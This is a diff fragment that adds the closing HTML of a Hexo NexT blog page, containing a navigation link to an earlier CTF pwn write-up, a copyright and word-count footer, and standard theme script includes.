+            <div class="post-nav-item">
+                <a href="/2024/08/15/lit-ctf-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" rel="prev" title="LIT - CTF - PWN部分题解">
+                  <i class="fa fa-angle-left"></i> LIT - CTF - PWN部分题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">da1sy</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">54k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">49 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
